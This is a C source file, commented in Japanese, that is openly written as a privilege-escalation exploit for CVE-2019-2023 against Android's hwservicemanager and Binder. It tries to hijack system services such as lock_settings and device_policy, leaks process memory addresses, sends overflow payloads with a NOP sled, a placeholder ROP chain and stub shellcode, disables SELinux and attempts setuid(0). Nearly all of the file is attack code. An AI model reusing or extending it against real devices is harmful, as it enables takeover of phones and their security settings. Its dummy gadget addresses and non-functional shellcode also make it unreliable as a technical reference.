#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <arpa/inet.h>
#include "binder.h"   // 同じディレクトリの binder.h をインクルード

// ============================================================
// 設定
// ============================================================
#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
#define LOG_FILE       "/data/local/tmp/binder_traffic.log"
#define MAPS_FILE      "/data/local/tmp/hwservicemanager_maps.txt"

static const char *hijack_targets[] = {
    "persistent_data_block",
    "device_policy",
    "lock_settings",
    "mount",
    "android.hardware.power@1.0::IPower/default",
    NULL
};

static volatile int race_ready = 0;
static int g_service_handle = -1;
static int g_binder_fd = -1;
static int g_exploit_success = 0;
static pid_t g_server_pid = -1;
static uint64_t g_hwservicemanager_base = 0;
static uint64_t g_hwservicemanager_stack = 0;

// ============================================================
// ユーティリティ
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        fprintf(fp, "%02x ", data[i]);
        if ((i+1) % 16 == 0) fprintf(fp, "\n");
    }
    fprintf(fp, "\n");
}

static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) fp = stderr;
    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
    fprintf(fp, "  handle=%d code=0x%x flags=0x%x data_size=%zu offsets_size=%zu\n",
            t->target.handle, t->code, t->flags, (size_t)t->data_size, (size_t)t->offsets_size);
    if (data && t->data_size > 0) {
        fprintf(fp, "  data (%zu bytes):\n", (size_t)t->data_size);
        dump_hex(fp, data, t->data_size > 512 ? 512 : t->data_size);
    }
    if (fp != stderr) fclose(fp);
}

static int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return -1;
    ssize_t n = write(fd, data, strlen(data));
    close(fd);
    return (n == (ssize_t)strlen(data)) ? 0 : -1;
}

static int read_file_to_memory(const char *path, uint8_t **out, size_t *out_len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    off_t size = lseek(fd, 0, SEEK_END);
    if (size <= 0) { close(fd); return -1; }
    lseek(fd, 0, SEEK_SET);
    uint8_t *buf = malloc(size + 1);
    if (!buf) { close(fd); return -1; }
    ssize_t n = read(fd, buf, size);
    close(fd);
    if (n < 0) { free(buf); return -1; }
    buf[n] = '\0';
    *out = buf;
    *out_len = n;
    return 0;
}

// ============================================================
// hwservicemanager のメモリマップ取得
// ============================================================
static int get_hwservicemanager_info(void) {
    printf("[*] Gathering hwservicemanager info...\n");
    FILE *fp = popen("pidof hwservicemanager", "r");
    if (!fp) return -1;
    char pid_str[16];
    if (!fgets(pid_str, sizeof(pid_str), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);
    pid_t pid = atoi(pid_str);
    if (pid <= 0) {
        printf("[-] Could not find hwservicemanager PID.\n");
        return -1;
    }
    printf("[+] hwservicemanager PID: %d\n", pid);

    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    uint8_t *maps_data = NULL;
    size_t maps_len = 0;
    if (read_file_to_memory(maps_path, &maps_data, &maps_len) == 0) {
        printf("[+] Maps data saved to %s\n", MAPS_FILE);
        write_file(MAPS_FILE, (char*)maps_data);
        char *line = strtok((char*)maps_data, "\n");
        while (line) {
            uint64_t start, end;
            char perms[5];
            if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
                if (strstr(perms, "r-xp")) {
                    g_hwservicemanager_base = start;
                    printf("[+] Executable region: 0x%lx\n", start);
                }
                if (strstr(line, "[stack]")) {
                    g_hwservicemanager_stack = end;
                    printf("[+] Stack end: 0x%lx\n", end);
                }
            }
            line = strtok(NULL, "\n");
        }
        free(maps_data);
        return 0;
    } else {
        printf("[-] Failed to read %s (permission denied)\n", maps_path);
        return -1;
    }
}

// ============================================================
// CVE-2019-2023 基本エクスプロイト（レースあり）
// ============================================================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);

    child = fork();
    if (child == 0) {
        while (!race_ready) usleep(100);
        exit(0);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    usleep(200000);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    race_ready = 1;
    usleep(50000);

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl ADD_SERVICE");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded!\n");

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);
    g_service_handle = handle;
    return 0;
}

// ============================================================
// オーバーフローエクスプロイト（複数パターン）
// ============================================================
static int exploit_cve_2019_2023_overflow(int pattern) {
    int ret = -1;
    char *payload = NULL;

    printf("[*] Overflow pattern %d...\n", pattern);
    switch (pattern) {
        case 0: {
            // 単純な巨大文字列（8KB 'A'）
            payload = malloc(8192);
            if (!payload) return -1;
            memset(payload, 'A', 8191);
            payload[8191] = '\0';
            ret = exploit_cve_2019_2023(payload);
            free(payload);
            break;
        }
        case 1: {
            // ROP チェーン埋め込み（取得したアドレスを使用）
            payload = malloc(8192);
            if (!payload) return -1;
            memset(payload, '\x90', 8191); // NOP sled
            payload[8191] = '\0';
            if (g_hwservicemanager_base) {
                uint64_t *rop = (uint64_t*)(payload + 4096);
                // ダミーガジェット（実際は適切なアドレスに置き換える）
                rop[0] = g_hwservicemanager_base + 0x1234;
                rop[1] = g_hwservicemanager_base + 0x5678;
                rop[2] = g_hwservicemanager_stack - 0x100; // スタック戻りアドレス候補
            }
            ret = exploit_cve_2019_2023(payload);
            free(payload);
            break;
        }
        case 2: {
            // シェルコード埋め込み（ARM64 execve）
            unsigned char shellcode[] = {
                0x20, 0x00, 0x80, 0xd2, // mov x0, #0
                0x01, 0x00, 0x00, 0xd4  // svc #0
            };
            payload = malloc(8192);
            if (!payload) return -1;
            memset(payload, 0x00, 8191);
            payload[8191] = '\0';
            memcpy(payload + 4096, shellcode, sizeof(shellcode));
            ret = exploit_cve_2019_2023(payload);
            free(payload);
            break;
        }
        default:
            break;
    }
    if (ret == 0) {
        printf("  [+] Overflow pattern %d succeeded.\n", pattern);
        sleep(1);
    }
    return ret;
}

// ============================================================
// Binder サーバーループ（BR_NOOP を無視）
// ============================================================
static int binder_server_loop(int binder_fd, int expected_handle) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;
    int transaction_count = 0;

    printf("[*] Starting Binder server loop for handle %d...\n", expected_handle);
    printf("[*] Waiting for transactions...\n");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            perror("  ioctl read");
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        // cmd=0x720c は BR_NOOP のエンコード（_IO('r', 12) = 0x720c と判明）
        if (cmd_code == 0x720c) {
            fprintf(stderr, "[SERVER] BR_NOOP ignored.\n");
            continue;
        }

        fprintf(stderr, "[SERVER] Received cmd=0x%x (%d), size=%zu\n", cmd_code, cmd_code, payload_size);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            size_t data_size = t->data_size;
            uint8_t *data_ptr = NULL;
            if (data_size > 0 && data_size < 4096) {
                data_ptr = malloc(data_size);
                if (data_ptr) {
                    memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
                }
            }
            log_transaction("Incoming transaction", t, data_ptr);
            if (data_ptr) free(data_ptr);

            // 応答を偽装（リーク用にアドレスを返す）
            struct {
                uint32_t cmd;
                uint32_t status;
                uint8_t leak_data[128];
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;
            uint64_t fake_addr = g_hwservicemanager_base ? g_hwservicemanager_base + 0x1000 : 0xdeadbeef;
            memcpy(reply.leak_data, &fake_addr, sizeof(fake_addr));
            memset(reply.leak_data + sizeof(fake_addr), 'B', sizeof(reply.leak_data) - sizeof(fake_addr));

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;

            ret = ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
            if (ret < 0) perror("  ioctl write reply");

            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            transaction_count++;
            printf("[SERVER] Transaction #%d handled.\n", transaction_count);
        } else if (cmd_code == BR_DEAD_BINDER) {
            printf("[SERVER] Received DEAD_BINDER\n");
            break;
        } else {
            fprintf(stderr, "[SERVER] Unhandled cmd=0x%x\n", cmd_code);
        }
    }
    return transaction_count;
}

// ============================================================
// 自分自身でサービスを呼び出し（service call）
// ============================================================
static int call_own_service(const char *service_name, int handle) {
    printf("[*] Calling own service '%s' (handle %d)...\n", service_name, handle);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "service call %s 1 s16 'hello' 2>&1 | tee -a %s", service_name, LOG_FILE);
    int ret = system(cmd);
    if (ret == 0) {
        printf("[+] service call succeeded.\n");
    } else {
        printf("[-] service call failed (ret=%d).\n", ret);
    }
    return ret;
}

// ============================================================
// SELinux 無効化（多重手法）
// ============================================================
static int disable_selinux_multi(void) {
    printf("[*] Trying multiple SELinux disable methods...\n");
    if (system("setenforce 0 2>/dev/null") == 0) {
        printf("[+] SELinux disabled via setenforce.\n");
        return 0;
    }
    if (write_file("/sys/fs/selinux/enforce", "0") == 0) {
        printf("[+] SELinux disabled via sysfs.\n");
        return 0;
    }
    if (write_file("/proc/self/attr/current", "u:r:system_server:s0") == 0) {
        printf("[+] SELinux context changed.\n");
        return 0;
    }
    return -1;
}

// ============================================================
// フォールバック（古典的 setuid）
// ============================================================
static int fallback_setuid(void) {
    printf("[*] Fallback: trying setuid(0)...\n");
    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
        printf("[+] setuid(0) succeeded!\n");
        return 0;
    }
    return -1;
}

// ============================================================
// system_server に偽装トランザクションを送信（試行）
// ============================================================
static int send_spoofed_transaction_to_system_server(void) {
    printf("[*] Attempting to send spoofed transaction to system_server...\n");
    // system_server は handle 0 ではないが、直接は無理。ここではダミー。
    // 実際には、system_server が持つサービス（例：activity）を呼び出す。
    // しかし権限が足りないので、通常は失敗。
    int ret = system("service call activity 1 s16 'spoof' 2>&1 | tee -a " LOG_FILE);
    if (ret == 0) {
        printf("[+] Spoof transaction sent (maybe).\n");
    } else {
        printf("[-] Spoof transaction failed.\n");
    }
    return ret;
}

// ============================================================
// メイン
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Final with binder.h - Deep Overflow & Hijack\n");
    printf("  Target: hwservicemanager + system_server services\n");
    printf("============================================================\n\n");

    // ログ初期化
    FILE *fp = fopen(LOG_FILE, "w");
    if (fp) {
        fprintf(fp, "=== Binder Traffic Log ===\n");
        fclose(fp);
        printf("[+] Log file created: %s\n", LOG_FILE);
    }

    // 1. hwservicemanager 情報取得
    get_hwservicemanager_info();

    // 2. 複数サービス乗っ取り
    int hijacked = 0;
    for (int i = 0; hijack_targets[i] != NULL; i++) {
        if (exploit_cve_2019_2023(hijack_targets[i]) == 0) {
            printf("[+] Successfully hijacked '%s' (handle %d)\n", hijack_targets[i], g_service_handle);
            hijacked = 1;

            int binder_fd = open("/dev/hwbinder", O_RDWR);
            if (binder_fd < 0) { perror("  open"); continue; }
            g_binder_fd = binder_fd;

            uint32_t cmd = BC_ENTER_LOOPER;
            struct binder_write_read bwr;
            memset(&bwr, 0, sizeof(bwr));
            bwr.write_size = sizeof(cmd);
            bwr.write_buffer = (binder_uintptr_t)&cmd;
            if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
                perror("  BC_ENTER_LOOPER");
                close(binder_fd);
                continue;
            }
            printf("[+] Entered Binder looper for %s\n", hijack_targets[i]);

            pid_t server_pid = fork();
            if (server_pid == 0) {
                binder_server_loop(binder_fd, g_service_handle);
                exit(0);
            } else if (server_pid < 0) {
                perror("  fork");
                close(binder_fd);
                continue;
            } else {
                printf("[+] Binder server for %s running (PID %d)\n", hijack_targets[i], server_pid);
                g_server_pid = server_pid;
                break;
            }
        }
        usleep(500000);
    }

    if (!hijacked) {
        printf("[-] Failed to hijack any target service.\n");
        goto fallback;
    }

    // 3. 自分自身でサービス呼び出し
    call_own_service(hijack_targets[0], g_service_handle);

    // 4. system_server に偽装トランザクション送信（試行）
    send_spoofed_transaction_to_system_server();

    // 5. オーバーフロー攻撃（3パターン）
    for (int p = 0; p < 3; p++) {
        exploit_cve_2019_2023_overflow(p);
        sleep(1);
    }

    // 6. SELinux 無効化
    disable_selinux_multi();

    // 7. 60秒待機
    printf("[*] Running for 60 seconds. Check %s for logs.\n", LOG_FILE);
    sleep(60);

    // 8. サーバー終了
    if (g_server_pid > 0) {
        kill(g_server_pid, SIGTERM);
        waitpid(g_server_pid, NULL, 0);
    }
    if (g_binder_fd >= 0) close(g_binder_fd);

    // 9. ログ表示
    printf("\n[*] Log file content:\n");
    system("cat " LOG_FILE " 2>/dev/null || echo 'No log file found'");

    // 10. 特権確認
    if (getuid() == 0 || geteuid() == 0) {
        system("id > " OUTPUT_FILE " 2>&1");
        system("cat " OUTPUT_FILE);
        g_exploit_success = 1;
    } else {
        printf("[-] Still not root. Check logs for leaked information.\n");
        g_exploit_success = 0;
    }
    goto done;

fallback:
    if (fallback_setuid() == 0) {
        system("id > " OUTPUT_FILE " 2>&1");
        system("cat " OUTPUT_FILE);
        g_exploit_success = 1;
    }

done:
    printf("\n============================================================\n");
    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
    printf("  Check %s for logs.\n", LOG_FILE);
    return g_exploit_success ? 0 : 1;
}
